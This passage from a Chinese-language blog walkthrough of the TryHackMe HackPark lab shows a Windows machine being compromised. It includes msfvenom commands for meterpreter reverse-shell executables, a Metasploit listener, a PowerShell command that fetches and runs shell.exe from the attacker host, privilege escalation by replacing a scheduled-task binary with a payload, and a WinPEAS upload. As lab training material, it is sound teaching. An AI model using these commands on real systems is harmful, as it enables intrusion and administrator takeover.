+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072016607.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072016607.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072016607.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072016607.png"
+        title="image-20240307201637556" /></p>
+<p>msfvenom生成payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.2.124.22 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -e x86/shikata_ga_nai -f exe -o shell.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span class="line"><span class="cl">Found <span class="m">1</span> compatible encoders
+</span></span><span class="line"><span class="cl">Attempting to encode payload with <span class="m">1</span> iterations of x86/shikata_ga_nai
+</span></span><span class="line"><span class="cl">x86/shikata_ga_nai succeeded with size <span class="m">381</span> <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">x86/shikata_ga_nai chosen with final size <span class="m">381</span>
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">381</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">73802</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: shell.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>kali开启msf监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.2.124.22
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; 10.2.124.22
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.2.124.22:4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload目录下python开启web服务，在已经拿到的shell上使用powershell下载我们的payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">cd</span> C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+</span></span><span class="line"><span class="cl">powershell -c wget <span class="s2">&#34;http://10.2.124.22:8081/shell.exe&#34;</span> -outfile <span class="s2">&#34;shell.exe&#34;</span>
+</span></span><span class="line"><span class="cl">shell.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开启msf上的权限</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072023423.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072023423.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072023423.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072023423.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403072023423.png"
+        title="image-20240307202304366" /></p>
+<h3 id="what-is-the-os-version-of-this-windows-machine">What is the OS version of this windows machine?</h3>
+<p>Windows 2012 R2 (6.3 Build 9600)</p>
+<h3 id="what-is-the-name-of-the-abnormal-service-running">What is the name of the abnormal <em>service</em> running?</h3>
+<p>拿到普通用户权限后，要准备提权。如果是msf，那么可以考虑使用msf内置的一些自动化工具，它会自动找到存在问题、可利用的服务等，第二种方式就是自己手动寻找。比较推荐第二种方法，更灵活、全面。</p>
+<p>首先查看下进程信息：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081114584.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081114584.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081114584.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081114584.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081114584.png"
+        title="image-20240308111402489" /></p>
+<p>红框中的进程比较值得关注，因为这些都不是系统常规进程，尤其是还有一个可能和计划任务有关。去<code>C:\Program Files (x86)\SystemScheduler</code>看下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081116284.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081116284.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081116284.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081116284.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081116284.png"
+        title="image-20240308111603175" /></p>
+<p>有个<code>Events</code>，看下里面：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081123723.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081123723.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081123723.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081123723.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081123723.png"
+        title="image-20240308112353620" /></p>
+<p><code>Message.exe</code>进程是管理员权限运行的，而且是每分钟执行一次，那我们就可以考虑用它来进行提权了。</p>
+<p>这里的问题答案是<code>WindowsScheduler</code>。</p>
+<h3 id="what-is-the-name-of-the-binary-youre-supposed-to-exploit">What is the name of the binary you&rsquo;re supposed to exploit?</h3>
+<p><code>Message.exe</code></p>
+<h3 id="what-is-the-user-flag-on-jeffs-desktop">What is the user flag (on Jeffs Desktop)?</h3>
+<p>提权思路：直接替换<code>Message.exe</code>程序，因为是计划任务会自动启动该程序，那么就可以使用我们自己的payload来替换掉这个程序，这样在下次调用时，就会执行我们的payload，而且权限是Administartor权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.2.124.22 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4446</span> -e x86/shikata_ga_nai -f exe -o Message.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在kali上进行监听即可:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081135679.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081135679.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081135679.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081135679.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081135679.png"
+        title="image-20240308113512569" /></p>
+<p>拿到管理员权限，直接去读取对应的文件即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">759bd8af507517bcfaede78a21a73e39
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="what-is-the-root-flag">What is the root flag?</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">7e13d97f05f7ceb9881a3eb3d78d3e72
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation-without-metasploit">Privilege Escalation Without Metasploit</h2>
+<p>主要是看<code>WinPEAS</code>工具的使用，个人感觉在实战场景下除非是没有办法了，再上这种工具，因为公开的，特征比较明显，很容易被AV发现。虽然现在的版本已经开发了针对AV的混淆，但实战效果如何有待验证。</p>
+<p>在这里我们使用<code>WinPEAS</code>这个工具：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</p>
+<p>该工具会按照**<a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank" rel="noopener noreffer">book.hacktricks.xyz</a>**上的checklist来进行全自动检查，发现能本地提权的方法。</p>
+<p>现在该工具已经可以集成到msf中，作者开发了msf的module，直接在msf中调用module就可以实现WinPEAS的检查：https://github.com/carlospolop/PEASS-ng/tree/master/metasploit。module要求已经有一个session，然后会自动下载上传WinPEAS文件到目标上，并自动运行，但是在运行结束之前没有任何回显，需要一直等着。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081036894.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081036894.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081036894.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081036894.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081036894.png"
+        title="image-20240308103621743" /></p>
+<p>这种方式还有一个好处是，module与一个PASSWORD选项，会对脚本内容进行加解密，避免明文传输WinPEAS被流量设备发现。</p>
+<p>如果我们手动上传到目标机器，就需要手动执行一下，拿到结果。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">meterpreter &gt; lls
+</span></span><span class="line"><span class="cl">Listing Local: /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat
+</span></span><span class="line"><span class="cl"><span class="o">=============================================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode              Size   Type  Last modified              Name
+</span></span><span class="line"><span class="cl">----              ----   ----  -------------              ----
+</span></span><span class="line"><span class="cl">100644/rw-r--r--  <span class="m">83</span>     fil   2024-03-07 21:25:50 -0500  .gitattributes
+</span></span><span class="line"><span class="cl">100755/rwxr-xr-x  <span class="m">5306</span>   fil   2024-03-07 21:25:50 -0500  README.md
+</span></span><span class="line"><span class="cl">100755/rwxr-xr-x  <span class="m">36179</span>  fil   2024-03-07 21:25:50 -0500  winPEAS.bat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; upload winPEAS.bat
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading  : /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -&gt; winPEAS.bat
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploaded 35.33 KiB of 35.33 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -&gt; winPEAS.bat
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Completed  : /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -&gt; winPEAS.bat
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081047557.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081047557.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081047557.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081047557.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202403081047557.png"
+        title="image-20240308104744464" /></p>
+<p>接下来就是分析输出结果的工作了，看下<code>WinPEAS</code>的官方说明文档就好了。</p>
+<h2 id="总结">总结</h2>
+<p>扫描 -&gt; 用户密码爆破 -&gt; 后台路径穿越导致RCE的漏洞 -&gt; 上传shell -&gt; 反弹shell -&gt; 替换计划任务中有Administrator权限的程序为shell进行提权。</p>
+<ul>
+<li>Initial Access：用户密码爆破 -&gt; 后台路径穿越导致RCE的漏洞</li>
+<li>Privilege Escalation：替换计划任务中有Administrator权限的程序为shell进行提权</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-06</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/thm-hackpark/" data-title="TryHackMe -- HackPark" data-via="@YaoyaoShaw" data-hashtags="THM"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/thm-hackpark/" data-hashtag="THM"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/thm-hackpark/" data-title="TryHackMe -- HackPark"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/thm-hackpark/" data-title="TryHackMe -- HackPark"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/thm-hackpark/" data-title="TryHackMe -- HackPark"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thm/">THM</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2024/01/thm-alfred/" class="prev" rel="prev" title="TryHackMe -- Alfred"><i class="fas fa-angle-left fa-fw"></i>TryHackMe -- Alfred</a>
+            <a href="/2024/01/cobalt_strike_basic_no.1/" class="next" rel="next" title="Cobalt Strike Basic No.1 -- Basic and Infrastructure Management">Cobalt Strike Basic No.1 -- Basic and Infrastructure Management<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
